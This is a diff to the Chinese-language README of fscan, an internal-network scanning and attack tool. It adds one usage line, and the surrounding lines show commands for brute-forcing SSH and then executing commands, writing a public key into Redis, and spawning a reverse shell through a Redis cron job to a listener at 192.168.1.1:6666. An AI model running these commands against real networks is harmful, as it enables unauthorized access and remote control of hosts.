@@ -41,6 +41,7 @@ fscan.exe -h 192.168.1.1/16  (B段扫描)
 
 其他用法
 ```
+fscan.exe -h 192.168.1.1/24 -np -no -nopoc(跳过存活检测 、不保存文件、跳过web poc扫描)
 fscan.exe -h 192.168.1.1/24 -rf id_rsa.pub (redis 写公钥)
 fscan.exe -h 192.168.1.1/24 -rs 192.168.1.1:6666 (redis 计划任务反弹shell)
 fscan.exe -h 192.168.1.1/24 -c whoami (ssh 爆破成功后，命令执行)
